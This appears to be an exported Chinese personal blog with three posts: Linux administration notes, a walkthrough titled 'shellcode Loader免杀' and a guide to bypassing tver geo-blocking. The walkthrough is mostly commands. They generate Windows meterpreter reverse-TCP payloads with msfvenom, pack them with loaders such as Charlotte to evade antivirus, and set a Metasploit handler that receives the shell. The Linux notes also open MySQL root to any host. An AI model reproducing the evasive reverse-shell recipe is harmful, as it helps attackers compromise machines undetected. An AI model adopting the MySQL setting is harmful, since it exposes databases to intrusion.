<h3 id="ssh-服务"><a href="#ssh-服务" class="headerlink" title="ssh 服务"></a>ssh 服务</h3><ul>
<li><p>开启密钥关闭密码</p>
<ol>
<li>生成密钥对</li>
</ol>
<p><code>ssh-keygen -t rsa</code> 生成public key &amp; private key</p>
<p>/root/.ssh/id_rsa为private key</p>
<p>/root/.ssh/id_rsa.pub为public key</p>
<p>复制private key到本地进行，给予权限</p>
<ol start="2">
<li><p>修改ssh配置</p>
<p>/etc/ssh/sshd_config</p>
<p>中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PasswordAuthentication no</span><br><span class="line">PubkeyAuthentication yes ##使用key登录</span><br><span class="line">AuthorizedKeysFile .ssh/authorized_keys ##public key的名字</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ul>
<p>​    <strong>记得重启sshd服务</strong></p>
<p><code>service sshd restart</code></p>
<ol start="3">
<li><p>尝试登录</p>
<p>尝试用密钥登录</p>
</li>
</ol>
<h2 id="linux系统管理"><a href="#linux系统管理" class="headerlink" title="linux系统管理"></a>linux系统管理</h2><h3 id="进程管理"><a href="#进程管理" class="headerlink" title="进程管理"></a>进程管理</h3><h4 id="查看系统当中所有进程ps"><a href="#查看系统当中所有进程ps" class="headerlink" title="查看系统当中所有进程ps"></a>查看系统当中所有进程ps</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ps aux   #unix标准,bsd操作格式</span><br><span class="line">ps -le  #linux标准</span><br></pre></td></tr></table></figure>

<p>输出七个字段的解释:<br>USER     PID       %CPU      %MEM       VSZ     RSS      TTY          STAT      START      TIME        COMMAND</p>
<pre><code>VSZ:占用虚拟内存大小,单位kB

RSS:占用实际物理内存大小,单位KB

TTY:终端号,tty1-7代表本地控制终端,1~6是本地字符终端,tty7是图形终端,pts/0-255代表虚拟终端(远程登录)

STAT:status,R运行,S睡眠,T停止,s包含子进程,+位于后台

START:启动时间

TIME:cpu运算时间

COMMAND:产生进程的命令 
</code></pre>
<h4 id="查看系统状态"><a href="#查看系统状态" class="headerlink" title="查看系统状态"></a>查看系统状态</h4><p><code>top [option]</code></p>
<pre><code>-d 秒数,默认是三秒更新一次

P    cpu使用率排序,默认即为此项

M    以内存的使用率排序

N     以pid排序

q   退出top
</code></pre>
<h4 id="查看进程树"><a href="#查看进程树" class="headerlink" title="查看进程树"></a>查看进程树</h4><p><code>pstree [option]</code></p>
<p>-p :显示进程pid,详细显示</p>
<p>-u:显示进程的所属用户</p>
<h4 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h4><ol>
<li><p>kill命令(根据pid终止进程)</p>
<p><code>kill [signal] 进程pid</code>#-l显示所有数字选项</p>
<p>-1   重启</p>
<p>-9   强制终止</p>
<p>-15  默认信号,即正常终止进程</p>
</li>
<li><p>killall命令(根据进程名终止进程)</p>
<p><code>kill [option] [signal] 进程名</code></p>
<p>option:</p>
<p>-i   交互式,会询问是否要杀死某个进程</p>
<p>-I   忽略进程名大小写</p>
<p>signal和kill命令一样</p>
</li>
<li><p>pkill命令</p>
<p>按照进程名终止进程,和killall相同</p>
<p><code>pkill [option] [signal] 进程名</code></p>
<p>多了一个选项<code>-t   终端号</code>按照终端号(终端号就是TTY的值)踢出用户</p>
<ul>
<li><p>使用w查询本机已经登录的用户</p>
</li>
<li><p>踢出用户<code>pkill -t -9 终端号</code></p>
</li>
</ul>
</li>
</ol>
<h3 id="工作管理"><a href="#工作管理" class="headerlink" title="工作管理"></a>工作管理</h3><h4 id="任务后台"><a href="#任务后台" class="headerlink" title="任务后台"></a>任务后台</h4><ol>
<li>在一条命令的结尾加入一个”&amp;”,系统会在后台执行任务直到完成任务</li>
<li>在任务执行的过程中,ctrl+Z表示暂停任务(ctrl+C表示结束)</li>
</ol>
<h4 id="查看后台在执行的任务"><a href="#查看后台在执行的任务" class="headerlink" title="查看后台在执行的任务"></a>查看后台在执行的任务</h4><p><code>jobs [option] </code></p>
<p>-l  显示pid</p>
<p>“+”表示最后一个放入后台的工作,默认恢复的工作</p>
<p>“-“表示倒数第二个放入后台的工作</p>
<h4 id="恢复后台暂停的任务到前台"><a href="#恢复后台暂停的任务到前台" class="headerlink" title="恢复后台暂停的任务到前台"></a>恢复后台暂停的任务到前台</h4><p><code>fg %工作号</code></p>
<p>工作号是jobs的第一个字段的数字</p>
<p><strong>%号可以省略</strong>,恢复的就是jobs中显示+号的任务.</p>
<p>kill %工作号</p>
<h4 id="把后台暂停的任务继续后台执行"><a href="#把后台暂停的任务继续后台执行" class="headerlink" title="把后台暂停的任务继续后台执行"></a>把后台暂停的任务继续后台执行</h4><p><code>bg %工作号</code></p>
<h4 id="系统资源查看"><a href="#系统资源查看" class="headerlink" title="系统资源查看"></a>系统资源查看</h4><ol>
<li><p>vmstat监控系统资源</p>
<p><code>vmstat [刷新延时][刷新次数] </code></p>
</li>
<li><p>dmesg开机时内核检测信息,cpu等硬件信息</p>
</li>
<li><p>free [-b | -k | -m | -g] 内存使用状态</p>
<p>-b   以字节为单位显示</p>
<p>-k  以KB为单位显示</p>
<p>-m  以MB为单位显示</p>
<p>-g 以GB为单位显示</p>
</li>
<li><p>cat /proc/cpuinfo   显示cpu信息</p>
</li>
<li><p>uptime    显示top的第一行</p>
</li>
<li><p>uname [option]</p>
<p>-a   查看系统的所有信息</p>
<p>-r    查看内核的版本</p>
<p>-s    查看内核的名称</p>
<p>-m  查看操作系统位数</p>
</li>
<li><p>linux发行版本 lsb_release -a</p>
</li>
<li><p>lsof  [option]列出进程打开或使用的文件信息</p>
<p>-c  字符串 :只列出字符串开头的进程打开的文件</p>
<p>-u 用户名    : 只列出某个用户的进程打开的文件</p>
<p>-p pid :列出某个pid进程打开的文件</p>
<p>lsof -i :[ｐｏｒｔ]查看某个port的端口号</p>
</li>
</ol>
<h4 id="定时任务crond"><a href="#定时任务crond" class="headerlink" title="定时任务crond"></a>定时任务crond</h4><ul>
<li><p>一次性计划任务at（atom）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">在23:20重启网站服务</span></span><br><span class="line">at 23:30 # 进入交互式模式</span><br><span class="line"><span class="meta">at&gt;</span><span class="bash"> systemctl restart httpd</span></span><br><span class="line"><span class="meta">at&gt;</span><span class="bash"> 按下ctrl+d</span></span><br><span class="line">at -l #列出所有的一次性定时性任务</span><br><span class="line">atrm [数字] # 根据上一条命令列出的序号选择删除</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">不采用交互式直接写计划任务</span></span><br><span class="line">echo &quot;systemctl restart httpd&quot; | at 23:30       </span><br></pre></td></tr></table></figure></li>
<li><p>长期性计划任务</p>
<p><code>crontab [option]</code></p>
<p>-e  编辑crontab定时任务</p>
<p>-l   查询现有的crontab任务</p>
<p>-r   删除当前用户所有的crontab任务</p>
<p><strong>如果是当前用户直接crontab -e进入编辑状态</strong></p>
<p>格式 ：  <code>分、时、日、月、星期 命令</code></p>
<p>分0-59,一个小时的第几分钟</p>
<p>时0-23</p>
<p>日1-31</p>
<p>月1-12</p>
<p>星期 0,7都代表礼拜日</p>
<p>*代表任何时间</p>
<p>,表示不连续的时间</p>
<p>-表示连续的时间范围</p>
<p>*/n 表示每隔n分钟执行一次</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">当前用户下指定定时任务</span></span><br><span class="line">crontab -e#回车就可以进入编辑页面</span><br><span class="line"><span class="meta">#</span><span class="bash">usage:</span></span><br><span class="line">crontab [ -u user ] file</span><br><span class="line">crontab [ -u user ] &#123; -l | -r | -e &#125;</span><br><span class="line"><span class="meta">#</span><span class="bash">example,相当于进入了一个crontab文件里面，直接写命令就行</span></span><br><span class="line">crontab -r</span><br></pre></td></tr></table></figure>

<p><strong>注意</strong></p>
<ul>
<li>除了用逗号（,）来分别表示多个时间段，例如“8,9,12”表示8月、9月和12月。还可以用减号（-）来表示一段连续的时间周期（例如字段“日”的取值为“12-15”，则表示每月的12～15日）。以及用除号（/）表示执行任务的间隔时间（例如“*/2”表示每隔2分钟执行一次任务）</li>
<li>在crond服务的计划任务参数中，所有命令一定要用绝对路径的方式来写</li>
</ul>
</li>
</ul>
<h2 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h2><p>  /var/log/cron  记录了定时任务相关日志</p>
<p>  /var/log/cups/ 记录了打印信息的日志</p>
<p>  /var/log/dmesg  记录了系统在开机时自检的信息</p>
<p>  /var/log/btmp  吧记录错误登录的日志,该文件是个二进制文件,只能用lastb命令查看</p>
<p>  /var/log/lastlog  记录系统中所有用户最后一次登录时间日志,也是二进制文件,用lastlog命令查看</p>
<p>  /var/log/maillog  记录邮件信息</p>
<p>  /var/log/message  记录系统重要的信息的日志</p>
<p>  /var/log/secure  记录验证和授权的方面信息,设计用户密码都会记录</p>
<p>  /var/log/wtmp    永久记录所有用户的登录注销信息,记录的用户的启动重启关机时间,只能用last命令查看</p>
<p>  /var/run/utmp   记录当前已经登录的用户信息,文件会伴随着用户的登录和注销不断的变化,只能用w,who,users命令来查看</p>
<h3 id="rsyslogd日志服务"><a href="#rsyslogd日志服务" class="headerlink" title="rsyslogd日志服务"></a>rsyslogd日志服务</h3><p>  基本日志包含四列:</p>
<ul>
<li>事件发生的时间</li>
<li>产生时间的主机名</li>
<li>产生事件的服务名</li>
<li>产生的日志具体信息</li>
</ul>
<p>  /etc/rsyslog.conf 配置文件内容</p>
<p>  例子: authpriv.*    /var/log/secure</p>
<p>  #<code>服务名称  [连接符号]  日志等级     日志所在的位置</code></p>
<ul>
<li><p>服务名称</p>
<table>
<thead>
<tr>
<th>服务名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>auth</td>
<td>安全和认证相关消息(不推荐用authpriv替代)</td>
</tr>
<tr>
<td>authpriv</td>
<td>安全和认证的相关消息</td>
</tr>
<tr>
<td>cron</td>
<td>系统定时任务cront和at产生的日志</td>
</tr>
<tr>
<td>daemon</td>
<td>各个守护进程相关的日志</td>
</tr>
<tr>
<td>kern</td>
<td>内核产生的日志</td>
</tr>
<tr>
<td>local10-local7</td>
<td>为本地服务使用预留的服务</td>
</tr>
<tr>
<td>lpr</td>
<td>打印产生的日志</td>
</tr>
<tr>
<td>ftp</td>
<td>ftp守护进程产生的日志</td>
</tr>
</tbody></table>
</li>
<li><p>连接符号</p>
<table>
<thead>
<tr>
<th>连接符号</th>
<th>识别等级</th>
</tr>
</thead>
<tbody><tr>
<td>*</td>
<td>表示所有的日志等级.比如authpriv.*表示authpriv认证服务信息产生的日志所有的日志等级都记录</td>
</tr>
<tr>
<td>.</td>
<td>代表只要比后面等级高的(包含该等级)日志都记录下来,比如cron.info就是代表cron产生的日志比info高的都记录</td>
</tr>
<tr>
<td>.-=</td>
<td>表示只记录所需要的等级,,其他等级不仅录</td>
</tr>
<tr>
<td>.!</td>
<td>表示除了该等级的日志外其他等级都记录</td>
</tr>
</tbody></table>
</li>
<li><p>日志等级</p>
<table>
<thead>
<tr>
<th>等级名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>debug</td>
<td>一般的调试信息的说明</td>
</tr>
<tr>
<td>info</td>
<td>基本的通知信息</td>
</tr>
<tr>
<td>notice</td>
<td>普通信息,但有一定重要性</td>
</tr>
<tr>
<td>warning</td>
<td>警告等级,但还不会影响服务和系统运行</td>
</tr>
<tr>
<td>err</td>
<td>错误信息,说明可以影响到服务或系统运行</td>
</tr>
<tr>
<td>crit</td>
<td>临界状态信息</td>
</tr>
<tr>
<td>alert</td>
<td>警告状态信息,必须立即采取行动`</td>
</tr>
<tr>
<td>emerg</td>
<td>紧急等级信息,系统gg或即将gg</td>
</tr>
</tbody></table>
</li>
</ul>
<h3 id="日志轮替"><a href="#日志轮替" class="headerlink" title="日志轮替"></a>日志轮替</h3><ul>
<li><p>日志文件的命名规则</p>
<ul>
<li><p>如果配置文件中有dateext参数,就会以日期作为日志文件的后缀</p>
</li>
<li><p>如果没有加dateext参数,日志温煦会自动改名,按照自然数序列自动往上加</p>
</li>
</ul>
</li>
<li><p>日志轮替的配置文件</p>
<p>/etc/logrotate.conf</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>参数说明</th>
</tr>
</thead>
<tbody><tr>
<td>daily</td>
<td>日志轮替的周期是每天</td>
</tr>
<tr>
<td>weekly</td>
<td>周期是每周</td>
</tr>
<tr>
<td>monthly</td>
<td>每月</td>
</tr>
<tr>
<td>rotate 数字</td>
<td>保留日志文件的个数,0是没有备份</td>
</tr>
<tr>
<td>compress</td>
<td>日志轮替时,旧的日志进行压缩</td>
</tr>
<tr>
<td>create mode owner group</td>
<td>建立新的日志,同时指定新日志的权限和所有者和所属组.如create 0600 root utmp</td>
</tr>
<tr>
<td>mail address</td>
<td>日志轮替的时候,输出内容通过右键发送到指定邮件地址.mail 邮件地址</td>
</tr>
<tr>
<td>missingok</td>
<td>如果日志不存在,忽略该日志警告信息</td>
</tr>
<tr>
<td>notifempty</td>
<td>日志为空文件,则不进行日志轮替</td>
</tr>
<tr>
<td>minsize 大小</td>
<td>日志轮替的最小值,只有日志达到这个值才会轮替</td>
</tr>
<tr>
<td>size 大小</td>
<td>日志只有大于指定大小才会轮替,而不是按照时间轮替. 比如 size 100k</td>
</tr>
<tr>
<td>dateext</td>
<td>使用日期作为日志轮替文件的后缀</td>
</tr>
</tbody></table>
</li>
</ul>
<p>  rpm包安装不需要手动做日志轮替,只有源码包需要</p>
<p>  logratate命令</p>
<p>  <code>logrotate [option]    配置文件名</code>  默认的配置文件为/etc/logrotate.conf</p>
<p>  -v   显示日志轮替的过程,</p>
<p>  -f 强制日志轮替,忽略条件是否符合.</p>
<h2 id="启动管理"><a href="#启动管理" class="headerlink" title="启动管理"></a>启动管理</h2><h3 id="运行级别"><a href="#运行级别" class="headerlink" title="运行级别"></a>运行级别</h3><table>
<thead>
<tr>
<th>运行级别</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>关机</td>
</tr>
<tr>
<td>1</td>
<td>单用户模式,主要用于系统修复</td>
</tr>
<tr>
<td>2</td>
<td>不完全的命令行模式,不含nfs服务</td>
</tr>
<tr>
<td>3</td>
<td>完全的命令行模式,就是标准字符界面</td>
</tr>
<tr>
<td>4</td>
<td>系统保留</td>
</tr>
<tr>
<td>5</td>
<td>图形模式</td>
</tr>
<tr>
<td>6</td>
<td>重启动</td>
</tr>
</tbody></table>
<ul>
<li>运行级别命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">runlevel #查看运行级别</span><br><span class="line">init 运行级别 #改变运行级别命令</span><br></pre></td></tr></table></figure>

<ul>
<li>系统默认运行级别 </li>
</ul>
<p>​       在文件/etc/inittab,修改配置文件即可.</p>
<p>​        这个配置文件在最新的发行版中以及不生效了,<code>sudo systemctl set-default runlevel5.target</code>运行级别相同,语法改成如上即可</p>
<h3 id="启动过程"><a href="#启动过程" class="headerlink" title="启动过程"></a>启动过程</h3><p>![linux sys ](<a href="https://github.com/LycsHub/ImageHosting/raw/master/linux">https://github.com/LycsHub/ImageHosting/raw/master/linux</a> sys .jpg)</p>
<p>“内核解压并且自检”这一步之后因为linux默认调用的是ide接口的驱动无法加载sata接口硬盘,而装有sata驱动模块在硬盘中,形成死锁.</p>
<p>为了解决这个问题linux引入了一个叫做initramfs的文件放在boot目录下,在mbr加载引导程序的时候加载这个文件,这个文件是一个类似整个linux的文件系统目录的文件,被系统内核加载之后linux可以跳过读取硬盘的步骤,直接在iniramfs中读取所需要的驱动和依赖,解决死锁问题</p>
<p>在”挂载真正的根目录”后系统开始调用启动程序,并且根据各种文件确定启动的系统的运行级别和需要启动的服务,最后进入系统完成开机</p>
<ul>
<li><p>关于调用/etc/rc[0-6].d文件</p>
<p>由这个脚本文件按照不同的运行级别启动相应的程序,</p>
<ul>
<li>k开头的文件是按照数字顺序默认关闭(kill)</li>
<li>s开头的文件是按照数字顺序默认启动(start)</li>
</ul>
</li>
</ul>
<h3 id="grub配置文件"><a href="#grub配置文件" class="headerlink" title="grub配置文件"></a>grub配置文件</h3><p>/boot/grub/grub.conf</p>
<p>![linux grub](<a href="https://github.com/LycsHub/ImageHosting/raw/master/linux">https://github.com/LycsHub/ImageHosting/raw/master/linux</a> grub.jpg)</p>
<p>该文件中default=0是启动第一个操作系统</p>
<p>timeout是等待时间</p>
<p>hiddenmenu是隐藏菜单</p>
<h4 id="grub加密和调整字符界面分辨率"><a href="#grub加密和调整字符界面分辨率" class="headerlink" title="grub加密和调整字符界面分辨率"></a>grub加密和调整字符界面分辨率</h4><h4 id="grub加密"><a href="#grub加密" class="headerlink" title="grub加密"></a>grub加密</h4><ol>
<li>生成加密密码串 <code>grub-md5-crypt</code></li>
<li>在grub.conf中加入<code>password --md5 加密后内容</code></li>
</ol>
<h4 id="字符界面分辨率调整"><a href="#字符界面分辨率调整" class="headerlink" title="字符界面分辨率调整"></a>字符界面分辨率调整</h4><p>没啥屌用</p>
<h3 id="系统修复模式"><a href="#系统修复模式" class="headerlink" title="系统修复模式"></a>系统修复模式</h3><ul>
<li>单用户模式</li>
</ul>
<p>在grub启动的界面选择按e进入编辑然后选择内核接着按e,quit后加一个1保存后退回界面然后b启动</p>
<ul>
<li><p>光盘修复模式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">先进入救援模式</span></span><br><span class="line"><span class="meta">#</span><span class="bash">以下演示的例子是误删文件inittab</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<p>chroot /mnt/sysimage#更改主目录进入系统</p>
<p>cd /root</p>
<p>rpm -qf /etc/inittab #查询/etc/inittab属于哪个包</p>
<p>mkdir /mnt/cdrom #建立挂载点</p>
<p>  mount /dev/sr0 /mnt/cdrom #挂载光盘</p>
<p>  rpm2cpio /mnt/cdrom/Packages/包名 | cpio -idv ./etc/inittab # 提取inittab到当前目录<br>  cp /etc/inittab /etc/inittab  #复制文件到指定位置</p>
<h2 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h2><p>需要备份目录:</p>
<p>/root</p>
<p>/home</p>
<p>/var/spool/mail</p>
<p>/etc</p>
<p>其他目录</p>
<ul>
<li>apache备份的数据<ul>
<li>配置文件</li>
<li>网页主目录</li>
<li>日志文件</li>
</ul>
</li>
<li>mysql需要备份的数据<ul>
<li>源码包:/usr/local/mysql/data</li>
<li>rpm包:/var/lib/mysql</li>
</ul>
</li>
</ul>
<h3 id="备份命令"><a href="#备份命令" class="headerlink" title="备份命令"></a>备份命令</h3><ul>
<li><p>dump命令</p>
<p><code>dump [option] 备份后文件名 源文件或者目录</code></p>
<p>-level:0-9个备份等级</p>
<p>-f:文件名</p>
<p>-u:备份成功后,把备份时间记录在/etc/dumpdates文件</p>
<p>-v:显示备份过程中输出更多信息</p>
<p>-j:调换bzlib库压缩备份文件,其实就是把备份文件压缩为.bz2格式</p>
<p>-W:显示允许被dump的分区备份等级及备份时间</p>
</li>
<li><p>restore命令</p>
<p><code>restore [mode] [option]</code></p>
<p>4个模式不能混用</p>
<p>-C 比较备份数据和实际数据的变化</p>
<p>-i 进入交互模式,手工选择需要恢复的文件</p>
<p>-t  查看模式,用于查看备份文件中用有哪些数据</p>
<p>-r 还原模式,用于数据还原</p>
<p>option</p>
<p>-f 指定备份文件的文件名</p>
</li>
</ul>
<h2 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h2><p><code>apt-get install lrzsz</code>安装lrzsz让linux支持xshell自带的zmodem</p>
<ul>
<li><p>缓存cache和缓冲buffer的区别</p>
</li>
<li><p>cache是利用内存加速数据从硬盘读取的速度</p>
</li>
<li><p>buffer则是利用内存加速数据写入硬盘的速度</p>
</li>
</ul>
<p>init3下终端输入中文方法：</p>
<p>利用：zhcon，输入命令<code>zhcon --utf8</code></p>
<p>进入终端界面后使用CTRL+2进行输入法切换</p>
<p>ubuntu 图形化，应用中心的图标快捷方式，应用在/usr/share/application</p>
<ul>
<li>mysql开启远程访问</li>
</ul>
<p>使用SSH连接到服务器，登录到MySQL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p 数据库root密码</span><br></pre></td></tr></table></figure>

<p>写入SQL语句,开启远程访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt;  use mysql;</span><br><span class="line">mysql&gt;  update user set host = &#x27;%&#x27; where user = &#x27;root&#x27;;</span><br></pre></td></tr></table></figure>

<p>运行下面的语句，查看设置是否生效（显示%的值）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select host,user from user where user=&#x27;root&#x27;</span><br></pre></td></tr></table></figure>

<p>退出MySQL命令，回到Linux命名模式，重启MySQL</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl restart mysqld</span><br></pre></td></tr></table></figure>

<p><a href="https://support.websoft9.com/docs/mysql/zh/stack-accounts.html#mysql">https://support.websoft9.com/docs/mysql/zh/stack-accounts.html#mysql</a></p>
<p><a href="https://support.websoft9.com/docs/linux/zh/#%E6%94%B9%E8%BF%9B">https://support.websoft9.com/docs/linux/zh/#%E6%94%B9%E8%BF%9B</a></p>
<p><strong>iconv  -f gbk -t utf-8 index.html &gt; aautf8.html</strong></p>
]]></content>
      <categories>
        <category>操作系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>基础操作</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode Loader免杀</title>
    <url>/2021/11/22/shellcode-Loader%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<p>测试了一下几款找到的免杀工具</p>
<span id="more"></span>

<h2 id="shellcode-Loader免杀-windows"><a href="#shellcode-Loader免杀-windows" class="headerlink" title="shellcode Loader免杀(windows)"></a><a href="https://github.com/knownsec/shellcodeloader/blob/master/readme_cn.md">shellcode Loader免杀</a>(windows)</h2><p>通过shellcode loader来加载bin文件，达到免杀的效果</p>
<h3 id="使用msfvenom生成bin"><a href="#使用msfvenom生成bin" class="headerlink" title="使用msfvenom生成bin"></a>使用msfvenom生成bin</h3><p>LHOST和LPORT是攻击机的ip和端口</p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.100.103 LPORT=4444 -f raw &gt; shellcode.bin</code></p>
<h3 id="目标机"><a href="#目标机" class="headerlink" title="目标机"></a>目标机</h3><p>然后就是进入他的安装包里面，将生成bin直接拖入文本框，点击生成</p>
<p>会在桌面生成一个loader.exe点击运行即可</p>
<h3 id="攻击机"><a href="#攻击机" class="headerlink" title="攻击机"></a>攻击机</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler        # 加载模块</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp        # 设置payload</span><br><span class="line">msf exploit(multi/handler) &gt; set LHOST IP    # 设置接收shell的ip</span><br><span class="line">msf exploit(multi/handler) &gt; set LPORT 端口       # 设置生成木马时设置的端口</span><br><span class="line">msf exploit(multi/handler) &gt; run       # 监听</span><br></pre></td></tr></table></figure>

<p>测了一圈，<code>CreateThreadPoolWait　Load</code>　的效果最好</p>
<p>也是火绒免杀</p>
<h2 id="Charlotte-windows免杀"><a href="#Charlotte-windows免杀" class="headerlink" title="Charlotte(windows免杀)"></a><a href="https://github.com/9emin1/charlotte">Charlotte(windows免杀)</a></h2><blockquote>
<p>2021.11.22　火绒免杀</p>
</blockquote>
<p>使用步骤</p>
<ol>
<li>git clone <a href="https://github.com/9emin1/charlotte.git">https://github.com/9emin1/charlotte.git</a> &amp;&amp; apt-get install mingw-w64*</li>
<li>cd charlotte</li>
<li>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$YOUR_IP LPORT=$YOUR_PORT -f raw &gt; beacon.bin</li>
<li>python charlotte.py</li>
</ol>
<h3 id="使用msfvenom生成bin-1"><a href="#使用msfvenom生成bin-1" class="headerlink" title="使用msfvenom生成bin"></a>使用msfvenom生成bin</h3><p>按照他的用法，装完他的环境之后第一步还是msfvenoms生成一个bin</p>
<p>对于我的攻击机就是<code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.100.103 LPORT=4444 -f raw &gt; beacon.bin</code></p>
<p>打印出来的最后一句就是需要执行的命令</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637554799578-2021-11-2212:19:59.png"></p>
<h3 id="攻击机监听端口"><a href="#攻击机监听端口" class="headerlink" title="攻击机监听端口"></a>攻击机监听端口</h3><p><strong>set payload那步需要和之前msfvenom生成的payload一致，不然监听不到</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler        # 加载模块</span><br><span class="line">msf exploit(multi/handler) &gt; set payload windows/x64/meterpreter_reverse_tcp        # 设置payload</span><br><span class="line">msf exploit(multi/handler) &gt; set LHOST IP    # 设置接收shell的ip</span><br><span class="line">msf exploit(multi/handler) &gt; set LPORT 端口       # 设置生成木马时设置的端口</span><br><span class="line">msf exploit(multi/handler) &gt; run       # 监听</span><br></pre></td></tr></table></figure>



<h3 id="目标机-1"><a href="#目标机-1" class="headerlink" title="目标机"></a>目标机</h3><p>目标机运行dll</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637553901011-2021-11-2212:05:01.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637554094038-2021-11-2212:08:14.png"></p>
<p>成功拿到shell</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1637555076392-2021-11-2212:24:36.png"></p>
<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>拿到shell之后需要干什么？</p>
<p><a href="https://xz.aliyun.com/t/2536#toc-9">https://xz.aliyun.com/t/2536#toc-9</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title>tver解锁与追剧推荐</title>
    <url>/2022/02/05/tver%E8%A7%A3%E9%94%81%E4%B8%8E%E8%BF%BD%E5%89%A7%E6%8E%A8%E8%8D%90/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>假期余额不多，马上就要开始新的搬砖了，春节期间无聊疯狂看日剧，特此水一篇blog，记录一下自己使用最少流量解锁tver流媒体</p>
<p>众所周知字幕组制作字幕需要一些时间，而且发布往往通过百度网盘这种高(垃)级(圾)的方式或者bt下载的方式进行下载，而且还存在一些版权上的问题，虽然字幕组都是用爱发电，但是能使用正版的方式观看还能更快的看到新剧发布，何乐而不为呢，之前一直都是直接用youtubedl来绕过tver的锁区，但是要下载就很麻烦，虽然可以丢在emby让服务器下载但总不那么优雅，使用专用的机场结点来解锁tver产生的很多视频流量。</p>
<p>所以有没有一种更经济与优雅的方式来解锁锁区的tver，的确有，本质还是通过代理流量来绕过锁区的限制，但视频流量不走代理（tver国内没墙）。</p>
<span id="more"></span>

<h2 id="tver解锁"><a href="#tver解锁" class="headerlink" title="tver解锁"></a>tver解锁</h2><p>需要的工具是一颗脑子，一个可以安装SwitchyOmega插件的浏览器（chrome,firefox均可），一个日本ip的结点（我用v2ray演示）</p>
<p>准备完毕开始解锁，首先设置我们的日本代理并且选择连接，注意一下走的协议和对应的端口我这里选的是socks5协议和10000端口（这部不清楚可以去网上找下对应代理的解锁教程）</p>
<p>然后重点便是我们浏览器中的插件，这个插件会根据我们的配置来自动代理流量做到分流的效果</p>
<p><strong>我们的目的就是让tver验证地区的流量走日本代理，其他流量走本地直连即可</strong></p>
<ol>
<li>新建一个profile这边我命名为japan,然后填入我们的代理连接信息，对应的就是我本地v2ray客户端启动的端口和协议</li>
</ol>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048155895-2022-2-516:02:36.png"></p>
<ol start="2">
<li><p>点击auto switch选项卡</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048316036-2022-2-516:05:16.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048337947-2022-2-516:05:38.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048364931-2022-2-516:06:05.png"></p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048404858-2022-2-516:06:45.png"></p>
<blockquote>
<p>其实主要是通过brightcove进行锁区的，有兴趣的可以搜索一下这个服务商，其他的域名通配（比如crisp.chat,googleapi）可能不走代理也可以</p>
</blockquote>
<p>添加几个情况让tver的解锁限制url走我们的代理，然后让我们的tver.jp走直连</p>
<p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048564047-2022-2-516:09:24.png"></p>
</li>
<li><p>然后将代理切换成auto switch，打开tver正常观看即可</p>
</li>
</ol>
<h2 id="实际效果"><a href="#实际效果" class="headerlink" title="实际效果"></a>实际效果</h2><p><img src="https://github.com/LycsHub/ImageHosting/raw/master/1644048799246-2022-2-516:13:19.png"></p>
<p>可以看到明显的没有产生视频流量，而我几乎看了半个下午的剧</p>
<h2 id="追剧网站推荐"><a href="#追剧网站推荐" class="headerlink" title="追剧网站推荐"></a>追剧网站推荐</h2><p>其他还有一些可以追剧的平台，我一直觉得tver的更新时间表怪怪的，这个就做的挺好，是一个聚合，国内可以直连</p>
<p><a href="https://www.fami-geki.com/vod/drama-matome/">https://www.fami-geki.com/vod/drama-matome/</a></p>
<p>恩，水完了，白嫖快乐。</p>
<blockquote>
<p>还有一点需要注意的是有的剧可能在firefox上无法播放，但chrome可以，所以可以切换下浏览器试试</p>
</blockquote>
]]></content>
      <tags>
        <tag>杂</tag>
      </tags>
